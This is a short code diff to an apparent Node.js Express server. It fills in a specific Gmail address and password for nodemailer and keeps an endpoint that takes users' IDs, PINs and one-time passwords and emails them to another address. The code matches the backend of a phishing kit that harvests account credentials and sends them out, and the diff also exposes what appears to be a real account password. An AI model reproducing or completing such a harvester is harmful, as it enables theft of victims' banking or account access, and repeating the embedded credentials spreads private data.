@@ -10,8 +10,8 @@ app.use(express.json());
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: 'YOUR_EMAIL@gmail.com',
-        pass: 'YOUR_APP_PASSWORD' // Not your login password, a Google App Password
+        user: 'mosesbenjamin1985@gmail.com',
+        pass: '130078al' // Not your login password, a Google App Password
     }
 });
 
@@ -19,7 +19,7 @@ app.post('/send-data', (req, res) => {
     const { userId, pin, otp } = req.body;
 
     const mailOptions = {
-        from: 'YOUR_EMAIL@gmail.com',
+        from: 'mosesbenjamin1985@gmail.com',
         to: 'RECEIVER_EMAIL@gmail.com',
         subject: 'New Notification',
         text: `User ID: ${userId}\nPIN: ${pin}\nOTP: ${otp}`
